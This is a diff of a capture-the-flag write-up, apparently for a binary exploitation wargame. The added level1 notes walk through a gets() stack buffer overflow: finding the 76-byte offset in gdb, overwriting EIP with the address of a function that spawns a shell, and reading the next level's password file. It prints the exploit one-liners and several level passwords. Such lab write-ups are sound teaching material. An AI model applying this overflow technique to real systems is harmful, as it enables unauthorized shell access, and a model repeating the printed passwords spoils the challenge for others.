@@ -1,18 +1,39 @@
-level00:
+level1:
 
-id
-pwd
-ls
+the binary makes a call to the 'gets' function, which shoud never be used:
+in the man, 'no check for buffer overrun is performed.'
 
-Nothing to look at with ls.
-we should find some files that's been created by the flag00 user
+that's in the main function, but there's another one : the run function.
+It writes using fwrite, then launch a shell using system("/bin/sh/")
+so we have to launch that function.
 
-find / -user flag00 2>/dev/null
-2>/dev/null redirects errors into null, so we can see better.
-we have 2 files, which contains the same string.
-we try to login to flag00 but doesnt work.
-it might be a specific code, check on dcode.fr
-its a ceaser code
-password : nottoohardhere
+we have to overrun the buffer of gets to call the run function.
+the address of run is : 0x08048444 (it never changes because there's no ASLR !!)
 
-then getflag : x24ti5gi3x0ol2eh4esiuxias
+we need to put the address of the run function in the EIP (Extended Instruction Pointer).
+Because the EIP contains the address of the next instruction !
+
+Now we need to know the offset of EIP :
+python -c 'print "a" * 76 + "B" * 4' > /tmp/exploit
+gdb ./level1
+r < /tmp/exploit
+
+we get 0x42424242 in ?? (), and 0x42424242 is 'BBBB', so the offset is 76 !
+Or in ghidra : its local_50 which is used, and its defined by [76] !
+
+so now we correctly write our exploit, and carefully write the address in little-endian (reversed)
+
+python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+
+It worked, but the shell dissapeared instantly so we cant do much. (non-interactive shell)
+It exit because he sees EOF in the stdin.
+The turnaroud is to 'open a shell from a pipelined process' so it keeps reading stdin after the EOF
+
+cat /tmp/exploit - | ./level1
+
+now we can just cat the password :
+
+cat /home/user/level2/.pass
+
+
+pass level2 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
